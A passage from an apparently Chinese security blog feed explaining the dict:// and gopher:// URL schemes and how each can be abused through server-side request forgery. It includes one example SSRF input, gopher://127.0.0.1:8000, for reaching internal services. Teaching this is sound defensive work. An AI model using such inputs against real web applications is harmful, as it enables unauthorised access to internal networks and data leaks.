通常用于指示一个字典服务器和要查询的词条。例如：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict://dict.org/merriam-webster/word</span><br></pre></td></tr></table></figure></div><p>此 URL 会请求连接到 <code>dict.org</code> 的字典服务，并查询 <code>merriam-webster</code> 词条下的 <code>word</code> 内容。</p><h4 id="常见用途：-1"><a href="#常见用途：-1" class="headerlink" title="常见用途："></a><strong>常见用途</strong>：</h4><ul><li><strong>字典查询</strong>：用户可以通过 <code>dict://</code> 协议访问各种公共或私人的字典服务器，获取词汇和术语的定义。</li><li><strong>教育和参考</strong>：这种协议可以用于访问科学、技术和文学领域的专业词汇。</li></ul><h4 id="攻击场景：-1"><a href="#攻击场景：-1" class="headerlink" title="攻击场景："></a><strong>攻击场景</strong>：</h4><p>虽然 <code>dict://</code> 协议本身并不会直接引发严重的安全问题，但如果 Web 应用错误地处理它，可能会导致一些间接的攻击机会。例如：</p><ul><li><strong>SSR攻击</strong>：攻击者如果能够控制 Web 应用输入的 URL，可能诱使应用通过 <code>dict://</code> 协议访问敏感内网资源（比如某些内部字典服务或数据库），从而泄露数据。</li><li><strong>暴露内部字典服务</strong>：某些应用可能通过 <code>dict://</code> 协议连接到内部的字典服务，如果攻击者可以操控输入，可能会导致未授权的服务访问，进而泄露信息。</li></ul><hr><h3 id="3-gopher-x2F-x2F-协议"><a href="#3-gopher-x2F-x2F-协议" class="headerlink" title="3. gopher:&#x2F;&#x2F; 协议"></a>3. <strong>gopher:&#x2F;&#x2F; 协议</strong></h3><h4 id="概述：-2"><a href="#概述：-2" class="headerlink" title="概述："></a><strong>概述</strong>：</h4><p><code>gopher://</code> 协议源自早期的互联网协议 Gopher，它是一种用于信息检索的协议，允许用户通过结构化的层次目录访问信息。虽然 Gopher 协议已经过时，但仍然存在一些遗留的 Gopher 服务器，供用户访问文件、文档等信息。</p><p>例如：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://gopher.floodgap.com/1/0/1/textfile.txt</span><br></pre></td></tr></table></figure></div><p>这将连接到一个 Gopher 服务器，下载 <code>textfile.txt</code> 文件。</p><h4 id="常见用途：-2"><a href="#常见用途：-2" class="headerlink" title="常见用途："></a><strong>常见用途</strong>：</h4><ul><li><strong>信息检索</strong>：Gopher 协议原本用于提供结构化的文本和信息检索，类似于早期的网络搜索引擎。</li><li><strong>教育和档案</strong>：一些旧的 Gopher 服务仍然在使用，用于存档资料或作为怀旧用途。</li></ul><h4 id="攻击场景：-2"><a href="#攻击场景：-2" class="headerlink" title="攻击场景："></a><strong>攻击场景</strong>：</h4><p>与 <code>file://</code> 和 <code>dict://</code> 协议相比，<code>gopher://</code> 协议的安全问题更加隐蔽，可能会被错误地使用或滥用。攻击者可以利用 SSRF 漏洞通过 <code>gopher://</code> 协议发起请求，尝试访问内网服务或获取信息。例如：</p><ul><li><strong>内部服务扫描</strong>：攻击者可以通过 Gopher 协议扫描目标 Web 应用所在网络中的内网服务。例如，可以利用 <code>gopher://127.0.0.1:8000</code> 来访问内网服务。</li><li><strong>信息泄露</strong>：攻击者可能通过 Gopher 协议访问目标服务器的未授权端口，泄露敏感的内部信息。</li></ul><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="SSRF" scheme="http://example.com/categories/SSRF/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="php伪协议" scheme="http://example.com/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
</feed>
